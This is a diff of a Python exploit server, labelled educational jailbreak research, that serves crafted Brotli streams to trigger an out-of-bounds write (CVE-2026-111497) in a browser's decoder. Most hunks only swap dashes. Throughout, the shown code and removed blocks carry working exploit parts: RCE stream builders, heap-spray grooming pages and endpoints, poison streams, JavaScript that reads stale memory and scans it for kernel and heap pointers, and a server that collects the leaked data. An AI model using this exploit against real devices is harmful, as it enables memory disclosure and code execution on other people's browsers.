@@ -6,7 +6,7 @@ BEFORE the trigger meta-block. The decoder writes prefix to ring buffer, then th
 trigger's copy commands reference prefix data via controlled distance. When block
 exhaustion triggers OOB, the write contains controlled (prefix) data.
 
-This is ONE coherent Brotli stream — no chunking, no appending, no staging.
+This is ONE coherent Brotli stream - no chunking, no appending, no staging.
 
 Educational jailbreak research only. For use on devices you own.
 """
@@ -138,7 +138,7 @@ def craft_trigger(command_count=40000):
 
 
 class Bits:
-    """Exact port of dimas Bits class — LSB-first writer for Brotli fields."""
+    """Exact port of dimas Bits class - LSB-first writer for Brotli fields."""
 
     def __init__(self):
         self.data = bytearray()
@@ -339,7 +339,7 @@ def build_rce_stream(prefix_bytes, command_block_extra=0xFFFFFF):
 
 def build_rce_stream_fast(prefix_bytes, command_block_extra=0x003F0F, extra=10000):
     """Build optimized RCE stream with minimal command count.
-    Much smaller than the full 23MB stream — typically 50-150KB."""
+    Much smaller than the full 23MB stream - typically 50-150KB."""
     return generate_rce_stream_fast(prefix_bytes, command_block_extra, extra) + b"\x00" * 3
 
 
@@ -375,7 +375,7 @@ def build_groom_stream(marker_byte, size=131072):
     """Build a valid Brotli stream that decompresses to `size` bytes of `marker_byte`.
 
     Uses brotli.compress() with lgwin=17 to force a 128KB ring buffer allocation.
-    The decompressed output is all one byte — recognizable in memory.
+    The decompressed output is all one byte - recognizable in memory.
     """
     try:
         import brotli
@@ -455,7 +455,7 @@ code { background: #222; padding: 2px 6px; border-radius: 3px; }
 </head>
 <body>
 <h1>CVE-2026-111497 RCE Stream Attack</h1>
-<p class="new">NEW: RCE stream approach — prefix is embedded as an uncompressed
+<p class="new">NEW: RCE stream approach - prefix is embedded as an uncompressed
 meta-block INSIDE the Brotli stream. ONE coherent stream, no staging needed.
 The decoder writes prefix to ring buffer, then trigger copies from prefix region.
 OOB write contains controlled data from prefix.</p>
@@ -469,12 +469,12 @@ The OOB write reads from prefix data in ring buffer.</p>
 <a href="/rce/gadget">RCE: 1KB prefix with gadget pairs (dimas pattern)</a>
 <a href="/rce/small-prefix">RCE: 64B prefix with marker</a>
 <a href="/rce/no-prefix">RCE: no prefix (generate_rce_stream with empty prefix)</a>
-<a href="/rce/mini">RCE MINI: 40K commands (~55KB) — fast test</a>
+<a href="/rce/mini">RCE MINI: 40K commands (~55KB) - fast test</a>
 <a href="/rce/mini/100k">RCE MINI: 100K commands (~137KB)</a>
 <a href="/rce/mini/1m">RCE MINI: 1M commands (~1.4MB)</a>
 
 <div class="section">
-<h2>RCE Streams — Command Block Extra Variants</h2>
+<h2>RCE Streams - Command Block Extra Variants</h2>
 <p class="info">Different command_block_extra values control block length after exhaustion.</p>
 <a href="/rce/cbe/0">RCE: command_block_extra=0</a>
 <a href="/rce/cbe/1000">RCE: command_block_extra=1000</a>
@@ -486,7 +486,6 @@ The OOB write reads from prefix data in ring buffer.</p>
 <p class="info">Opens parallel Brotli connections to spray 128KB ring buffers.
 Then releases half to create holes and fires poison stream into adjacent slot.</p>
 <a href="/groom/landing">GROOM: Interactive Heap Spray Page</a>
-<a href="/groom/auto">GROOM: Auto Heap Spray (runs all phases automatically)</a>
 <a href="/groom/status">GROOM: Check active groom sessions (JSON)</a>
 <a href="/probe/leaks">PROBE: View all leaked data (JSON)</a>
 </div>
@@ -498,7 +497,7 @@ Then releases half to create holes and fires poison stream into adjacent slot.</
 </div>
 
 <div class="section">
-<h2>Legacy Combined (broken — appends after trigger)</h2>
+<h2>Legacy Combined (broken - appends after trigger)</h2>
 <p class="info">These all fail with "cannot decode raw data" because appended bytes
 form invalid meta-block headers. Kept for reference.</p>
 <a href="/combined/crash">LEGACY: trigger + crash stage2</a>
@@ -620,7 +619,7 @@ async function firePoison() {
     log('[*] Phase 3: Firing poison RCE stream on /poison/leak ...', 'info');
     log('[*] This triggers deterministic OOB (cbe=0x003F0F, block_length=32768)', 'info');
 
-    // Fire the poison stream — the OOB write targets adjacent memory
+    // Fire the poison stream - the OOB write targets adjacent memory
     try {
         let poisonResp = await fetch(SERVER + '/poison/leak');
         let poisonText = await poisonResp.text();
@@ -650,7 +649,7 @@ async function readBack() {
             try {
                 let text = await responses[i].text();
                 log('[+] Groom ' + i + ': ' + text.length + ' bytes', 'ok');
-                // Look for corruption — bytes that don't match the expected marker
+                // Look for corruption - bytes that don't match the expected marker
                 let marker = (0x40 + i) & 0xFF;
                 let expectedChar = String.fromCharCode(marker);
                 let corrupted = 0;
@@ -701,270 +700,6 @@ async function readBack() {
 </html>"""
 
 
-GROOM_AUTO = """<!DOCTYPE html>
-<html>
-<head><title>Auto Heap Spray</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body { font-family: monospace; background: #111; color: #0f0; padding: 1em;
-       font-size: 14px; white-space: pre-wrap; }
-.err { color: #f44; } .info { color: #4af; } .warn { color: #f80; }
-</style>
-</head>
-<body id="log">Auto Heap Spray starting...
-<script>
-const S = location.origin;
-const N = 32;
-let ctrls = [], resps = [];
-let sid = Date.now().toString(36);
-
-function log(m, c) {
-    let s = document.createElement('span');
-    s.className = c || '';
-    s.textContent = m + '\\n';
-    document.getElementById('log').appendChild(s);
-    window.scrollTo(0, document.body.scrollHeight);
-}
-
-async function run() {
-    // Phase 1: Spray
-    log('\\n=== PHASE 1: Spray ' + N + ' groom connections ===', 'info');
-    let fetches = [];
-    for (let i = 0; i < N; i++) {
-        let c = new AbortController();
-        ctrls.push(c);
-        let m = (0x40 + i) & 0xFF;
-        fetches.push(
-            fetch(S + '/groom/' + sid + '/' + i + '?marker=' + m, {
-                signal: c.signal, headers: {'Accept': 'text/html'}
-            }).then(r => { resps[i] = r; log('[+] Groom ' + i + ' OK (0x' + m.toString(16) + ')'); })
-              .catch(e => { resps[i] = null; log('[-] Groom ' + i + ': ' + e.message, 'err'); })
-        );
-    }
-    await Promise.allSettled(fetches);
-    let ok = resps.filter(r => r).length;
-    log('Spray done: ' + ok + '/' + N + ' (' + (ok*128) + 'KB)', 'info');
-
-    // Phase 2: Release even slots
-    log('\\n=== PHASE 2: Release even connections ===', 'info');
-    for (let i = 0; i < N; i += 2) {
-        if (ctrls[i]) { ctrls[i].abort(); log('[~] Released ' + i); }
-    }
-    await new Promise(r => setTimeout(r, 300));
-
-    // Phase 3: Streaming stale-data capture via ReadableStream
-    log('\\n=== PHASE 3: Streaming stale-data capture ===', 'info');
-    log('Using ReadableStream to capture decoded data before OOB crash...', 'info');
-    let staleChunks = [];
-    let staleTotal = 0;
-    try {
-        let r = await fetch(S + '/stale-stream');
-        let reader = r.body.getReader();
-        try {
-            while (true) {
-                let {done, value} = await reader.read();
-                if (done) break;
-                staleChunks.push(new Uint8Array(value));
-                staleTotal += value.byteLength;
-                log('[+] Stream chunk: ' + value.byteLength + 'B (total: ' + staleTotal + 'B)');
-            }
-            log('[+] Stream completed cleanly: ' + staleTotal + 'B', 'info');
-        } catch(e) {
-            log('[!] Stream error after ' + staleTotal + 'B: ' + e.name + ': ' + e.message,
-                staleTotal > 0 ? 'warn' : 'err');
-        }
-    } catch(e) {
-        log('[-] Fetch failed: ' + e.name + ': ' + e.message, 'err');
-    }
-
-    // POST stream capture summary
-    try {
-        await fetch(S + '/probe/readback', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                session: sid, slot: -2, source: 'stale-stream-capture',
-                total_bytes: staleTotal, chunks: staleChunks.length
-            })
-        });
-        log('[+] Posted capture summary', 'info');
-    } catch(pe) { log('POST err: ' + pe.message, 'err'); }
-
-    // Analyze captured stale data
-    if (staleTotal > 0) {
-        log('\\n--- Stale data analysis (' + staleTotal + ' bytes) ---', 'info');
-        // Merge chunks
-        let merged = new Uint8Array(staleTotal);
-        let off = 0;
-        for (let c of staleChunks) { merged.set(c, off); off += c.byteLength; }
-
-        // Skip prefix (first 8 bytes are null)
-        let dataStart = 8;
-        let nonZero = 0, uniqueBytes = new Set();
-        for (let j = dataStart; j < Math.min(merged.length, dataStart + 4096); j++) {
-            if (merged[j] !== 0) nonZero++;
-            uniqueBytes.add(merged[j]);
-        }
-        log('First 4KB after prefix: ' + nonZero + ' non-zero bytes, ' + uniqueBytes.size + ' unique values');
-
-        // Show hex dump at ring-buffer wrap boundaries (every 128KB)
-        let rbSize = 131072;
-        for (let wrap = 0; wrap < Math.min(staleTotal, rbSize * 4); wrap += rbSize) {
-            let hex = '';
-            for (let j = wrap; j < Math.min(wrap + 64, merged.length); j++)
-                hex += merged[j].toString(16).padStart(2, '0') + ' ';
-            log('  @' + wrap + ': ' + hex.slice(0, 192), 'info');
-        }
-
-        // Look for pointer-like values (8-byte aligned)
-        let ptrs = [];
-        let dv = new DataView(merged.buffer);
-        for (let j = dataStart; j + 8 <= merged.length; j += 8) {
-            let lo = dv.getUint32(j, true);
-            let hi = dv.getUint32(j + 4, true);
-            if (lo === 0 && hi === 0) continue;
-            let val = (hi * 0x100000000) + lo;
-            // kernel ptr: 0xFFFFFE...
-            if (hi >= 0xFFFFFE00 && hi <= 0xFFFFFF00) ptrs.push({off: j, hi, lo, kind: 'KERNEL'});
-            // dyld shared cache: 0x180000000-0x280000000
-            else if (hi >= 1 && hi <= 2 && lo >= 0x80000000)
-                ptrs.push({off: j, hi, lo, kind: 'dyld_cache'});
-            // heap ptr
-            else if (hi >= 1 && hi <= 1 && lo >= 0)
-                ptrs.push({off: j, hi, lo, kind: 'heap'});
-        }
-        if (ptrs.length > 0) {
-            log('\\n[!!!] POINTER-LIKE VALUES FOUND: ' + ptrs.length, 'err');
-            for (let p of ptrs.slice(0, 20)) {
-                let hex = '0x' + p.hi.toString(16).padStart(8,'0') + p.lo.toString(16).padStart(8,'0');
-                log('  +0x' + p.off.toString(16) + ': ' + hex + ' (' + p.kind + ')', 'err');
-            }
-            // Report to server
-            try {
-                await fetch(S + '/probe/readback', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        session: sid, slot: -1, source: 'stale-stream',
-                        total_bytes: staleTotal, pointer_count: ptrs.length,
-                        pointers: ptrs.slice(0, 50).map(p => ({
-                            offset: p.off,
-                            value: '0x' + p.hi.toString(16).padStart(8,'0') + p.lo.toString(16).padStart(8,'0'),
-                            kind: p.kind
-                        }))
-                    })
-                });
-            } catch(pe) { log('POST err: ' + pe.message, 'err'); }
-        } else {
-            log('No pointer-like values in first scan', 'warn');
-            // Check for groom marker bytes (0x40-0x5F from slots 0-31)
-            let markerHits = {};
-            for (let j = dataStart; j < merged.length; j++) {
-                let b = merged[j];
-                if (b >= 0x40 && b <= 0x5F) {
-                    markerHits[b] = (markerHits[b] || 0) + 1;
-                }
-            }
-            let markers = Object.keys(markerHits);
-            if (markers.length > 0) {
-                log('[!] Groom marker bytes detected:', 'warn');
-                for (let m of markers.sort()) {
-                    log('  0x' + parseInt(m).toString(16) + ': ' + markerHits[m] + ' occurrences');
-                }
-            }
-            // POST summary back to server for logging
-            try {
-                await fetch(S + '/probe/readback', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        session: sid, slot: -1, source: 'stale-stream',
-                        total_bytes: staleTotal, chunks: staleChunks.length,
-                        non_zero_in_4k: nonZero, unique_bytes: uniqueBytes.size,
-                        marker_count: markers.length,
-                        markers: Object.fromEntries(markers.map(m => [
-                            '0x' + parseInt(m).toString(16), markerHits[m]
-                        ])),
-                        hex: Array.from(merged.slice(0, 256)).map(
-                            b => b.toString(16).padStart(2,'0')).join('')
-                    })
-                });
-                log('[+] Posted analysis to server', 'info');
-            } catch(pe) { log('POST err: ' + pe.message, 'err'); }
-        }
-    }
-
-    // Also fire legacy poison streams for comparison
-    log('\\n--- Legacy poison streams (for comparison) ---', 'info');
-    let endpoints = ['/poison/leak', '/stale-read'];
-    for (let ep of endpoints) {
-        try {
-            let r = await fetch(S + ep, {headers: {'Accept': 'application/octet-stream'}});
-            let buf = await r.arrayBuffer();
-            let t = new Uint8Array(buf);
-            let nonAscii = 0, hexPreview = '';
-            for (let j = 0; j < Math.min(80, t.length); j++) {
-                if (t[j] < 32 || t[j] > 126) nonAscii++;
-                hexPreview += t[j].toString(16).padStart(2,'0') + ' ';
-            }
-            log('[+] ' + ep + ': ' + t.length + ' bytes, ' + nonAscii + ' non-ASCII', t.length > 0 ? '' : 'warn');
-            log('    hex: ' + hexPreview.slice(0, 240), 'info');
-        } catch(e) {
-            log('[-] ' + ep + ': ' + e.name + ': ' + e.message, 'err');
-        }
-    }
-
-    // Phase 4: Read back odd groom slots
-    log('\\n=== PHASE 4: Read back odd groom responses ===', 'info');
-    let leaks = 0;
-    for (let i = 1; i < N; i += 2) {
-        if (!resps[i]) continue;
-        try {
-            let t = await resps[i].text();
-            let marker = (0x40 + i) & 0xFF;
-            let corrupted = 0;
-            for (let j = 0; j < t.length; j++) {
-                if (t.charCodeAt(j) !== marker) corrupted++;
-            }
-            if (corrupted > 0) {
-                leaks++;
-                log('[!!!] Groom ' + i + ': ' + corrupted + '/' + t.length + ' corrupted bytes!', 'err');
-                let first = -1;
-                for (let j = 0; j < t.length; j++) {
-                    if (t.charCodeAt(j) !== marker) { first = j; break; }
-                }
-                if (first >= 0) {
-                    let hex = '';
-                    for (let j = first; j < Math.min(first+32, t.length); j++)
-                        hex += t.charCodeAt(j).toString(16).padStart(2,'0') + ' ';
-                    log('    offset=' + first + ' hex: ' + hex, 'info');
-                    fetch(S + '/probe/readback', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({session:sid, slot:i, offset:first,
-                            hex:hex.trim(), total_len:t.length, corrupted_count:corrupted})
-                    });
-                }
-            } else {
-                log('[=] Groom ' + i + ': clean (' + t.length + 'B)');
-            }
-        } catch(e) {
-            log('[-] Groom ' + i + ': ' + e.message, 'err');
-        }
-    }
-
-    log('\\n=== COMPLETE ===', 'info');
-    log('Leaking slots: ' + leaks + '/' + (N/2), leaks > 0 ? 'err' : '');
-    log('Session: ' + sid, 'info');
-    window.scrollTo(0, document.body.scrollHeight);
-}
-
-run();
-</script>
-</body>
-</html>"""
-
-
 def _send_br_response(ssl_sock, payload):
     """Send a Content-Encoding: br response."""
     headers = (
@@ -976,35 +711,6 @@ def _send_br_response(ssl_sock, payload):
         b"Cache-Control: no-store\r\n\r\n"
     )
     ssl_sock.sendall(headers + payload)
-
-
-def _send_br_chunked_stream(ssl_sock, payload, split_frac=0.85, delay=0.5):
-    """Send Brotli payload using chunked transfer encoding with a delay.
-
-    Splits the raw Brotli bytes at split_frac (e.g. 85%) and sends the
-    first part, waits delay seconds, then sends the rest.  The browser's
-    Brotli decoder processes bytes incrementally, flushing decoded output
-    on ring-buffer wraps.  ReadableStream on the client can capture those
-    flushes before the OOB trigger in the tail bytes crashes the decoder.
-    """
-    split = int(len(payload) * split_frac)
-    part_a = payload[:split]
-    part_b = payload[split:]
-
-    headers = (
-        b"HTTP/1.1 200 OK\r\n"
-        b"Content-Type: application/octet-stream\r\n"
-        b"Content-Encoding: br\r\n"
-        b"Transfer-Encoding: chunked\r\n"
-        b"Access-Control-Allow-Origin: *\r\n"
-        b"Connection: close\r\n"
-        b"Cache-Control: no-store\r\n\r\n"
-    )
-    ssl_sock.sendall(headers)
-    ssl_sock.sendall(chunk(part_a))
-    time.sleep(delay)
-    ssl_sock.sendall(chunk(part_b))
-    ssl_sock.sendall(chunk_end())
 
 
 def _send_html(ssl_sock, body_str):
@@ -1173,30 +879,13 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
         elif path == "/stale-read":
             # Minimal-prefix RCE stream that reads from stale ring buffer data.
             # With a tiny prefix (8 bytes), the copy distance is small,
-            # so copies read from early ring buffer positions — likely
+            # so copies read from early ring buffer positions - likely
             # containing stale heap data from previous allocations.
             # cbe=0x003F0F gives block_length=32768 for deterministic behavior.
             prefix = b"\x00" * 8
             payload = build_rce_stream_fast(prefix, 0x003F0F)
             print(f"  -> STALE-READ: 8B null prefix, cbe=0x003F0F, total={len(payload)}B")
             _send_br_response(ssl_sock, payload)
-
-        # --- Streaming stale-data leak (ReadableStream capture) ---
-        elif path == "/stale-stream":
-            # Like /stale-read but sent via chunked transfer so the browser
-            # flushes decoded ring-buffer wraps through ReadableStream before
-            # the OOB trigger crashes the decoder.
-            # cbe=0x03F000 → block_length=274049, ~1.07MB of valid decoded
-            # output (8 ring-buffer wraps) before the OOB trigger fires.
-            # extra_commands=100 to minimize the OOB phase.
-            prefix = b"\x00" * 8
-            cbe = 0x03F000
-            bl = 16625 + cbe
-            payload = build_rce_stream_fast(prefix, cbe, extra=100)
-            print(f"  -> STALE-STREAM: {len(payload)}B, bl={bl}, "
-                  f"valid_out={bl*4}B ({bl*4//131072} wraps), chunked")
-            _send_br_chunked_stream(ssl_sock, payload, split_frac=0.85, delay=0.5)
-            return  # connection already closed by chunked helper
 
         # --- Optimized poison endpoints (small CBE for deterministic OOB) ---
         elif path.startswith("/poison/"):
@@ -1215,7 +904,7 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                 _send_br_response(ssl_sock, payload)
 
             elif variant == "info":
-                # Minimal OOB — just enough to corrupt adjacent ring buffer
+                # Minimal OOB - just enough to corrupt adjacent ring buffer
                 # cbe=0x000000 → block_length=16625, only 66500 bytes before OOB
                 prefix = bytearray(1024)
                 for i in range(0, 1024, 8):
@@ -1246,9 +935,6 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
         # --- Heap spray grooming endpoints ---
         elif path == "/groom/landing":
             _send_html(ssl_sock, GROOM_LANDING)
-
-        elif path == "/groom/auto":
-            _send_html(ssl_sock, GROOM_AUTO)
 
         elif path.startswith("/groom/") and "/" in path[7:]:
             # /groom/<session_id>/<slot>?marker=<byte>
@@ -1287,12 +973,12 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                 # the full stream is sent and decoded (allocating the 128KB
                 # ring buffer), then we keep the connection alive by sleeping
                 # before closing. The JS fetch() promise resolves when the full
-                # body arrives — the ring buffer was allocated during decode.
+                # body arrives - the ring buffer was allocated during decode.
                 _send_br_response(ssl_sock, groom_payload)
                 # Note: ring buffer may be freed after decode completes.
                 # For true hold-alive, we'd need to split the stream and
                 # withhold the final bytes. For now, the spray relies on
-                # allocator locality — freed buffers leave addressable holes.
+                # allocator locality - freed buffers leave addressable holes.
             else:
                 _send_html(ssl_sock, "400 Bad groom path")
 
@@ -1309,40 +995,10 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
             body = _read_post_body(ssl_sock, request)
             try:
                 data = json.loads(body)
-                hex_str = data.get('hex', '')
                 print(f"\n{'='*60}")
                 print(f"[LEAK] Session={data.get('session')} Slot={data.get('slot')}")
                 print(f"[LEAK] Offset={data.get('offset')} Corrupted={data.get('corrupted_count')}")
-                print(f"[LEAK] Hex ({len(hex_str)//2} bytes): {hex_str[:200]}")
-
-                # Auto-analyze leaked bytes for pointers
-                if hex_str:
-                    try:
-                        raw = bytes.fromhex(hex_str)
-                        import struct as st
-                        ptrs = []
-                        for off in range(0, len(raw) - 7, 8):
-                            val = st.unpack_from('<Q', raw, off)[0]
-                            if val == 0:
-                                continue
-                            # kernel pointer
-                            if 0xFFFFFE0000000000 <= val <= 0xFFFFFF0000000000:
-                                ptrs.append((off, val, 'KERNEL'))
-                            # dyld shared cache
-                            elif 0x180000000 <= (val & 0x0000FFFFFFFFFFFF) <= 0x280000000:
-                                ptrs.append((off, val, 'dyld_cache'))
-                            # heap pointer
-                            elif 0x100000000 <= (val & 0x0000FFFFFFFFFFFF) <= 0x180000000:
-                                ptrs.append((off, val, 'heap'))
-                        if ptrs:
-                            print(f"[LEAK] *** POINTERS FOUND ({len(ptrs)}) ***")
-                            for off, val, kind in ptrs[:10]:
-                                print(f"[LEAK]   +0x{off:04x}: 0x{val:016x} ({kind})")
-                        else:
-                            print(f"[LEAK] No recognizable pointers in {len(raw)} bytes")
-                    except Exception as e:
-                        print(f"[LEAK] Analysis error: {e}")
-
+                print(f"[LEAK] Hex: {data.get('hex', '')[:200]}")
                 print(f"{'='*60}\n")
                 with groom_lock:
                     leaked_data[data.get("session", "unknown")].append(data)
